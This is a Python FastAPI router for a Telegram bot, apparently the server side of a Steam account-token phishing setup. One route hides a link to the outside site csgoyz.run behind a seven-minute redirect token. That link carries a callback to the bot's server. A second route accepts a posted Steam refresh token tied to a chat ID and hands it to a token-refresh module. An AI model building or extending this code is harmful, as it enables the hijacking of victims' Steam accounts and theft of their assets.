from fastapi import APIRouter, Request
from fastapi.responses import RedirectResponse, JSONResponse, FileResponse
import asyncio
import refresh_tokens  # твой модуль
from yoomoney_module import REDIRECTS, create_temp_redirect
import time
TTL_STEAM = 420  # 7 минут в секундах

router = APIRouter()

SELF = "https://tg-bot-test-gkbp.onrender.com"


@router.get("/p/{token}")
async def temp_redirect(token: str):
    data = REDIRECTS.get(token)

    if not data:
        
        return FileResponse("static/minioni.jpeg", media_type="image/jpeg", status_code=404)

    if time.time() > data["expires"]:
        del REDIRECTS[token]
    
        return FileResponse("static/minioni.jpeg", media_type="image/jpeg", status_code=410)

    return RedirectResponse(data["url"])
    
# 1️⃣ старт авторизации
@router.get("/auth/start")
async def auth_start(chat_id: int):
    target_url = f"https://csgoyz.run/?tg_callback=https://tg-bot-test-gkbp.onrender.com/auth/receive?chat_id={chat_id}"
    token = create_temp_redirect(target_url, ttl=TTL_STEAM)  # <--- здесь TTL короткий
    public_url = f"https://tg-bot-test-gkbp.onrender.com/p/{token}"
    return RedirectResponse(public_url)


# 2️⃣ приём токенов
@router.post("/auth/receive")
async def auth_receive(request: Request, chat_id: int):
    data = await request.json()

    refresh = data.get("refresh")  # берём только refresh-token

    if not refresh:
        return JSONResponse({"error": "Refresh token not found"}, status_code=400)

    # Передаём в модуль refresh_tokens.py
    # from_steam=True → уведомление всегда при успехе/неуспехе
    asyncio.create_task(
        refresh_tokens.refresh_by_refresh_token_async(
            chat_id,
            refresh_token=refresh,
            from_steam=True  # важный флаг
        )
    )

    print(f"🔥 Refresh-token передан в модуль: chat_id={chat_id}")

    return JSONResponse({"ok": True})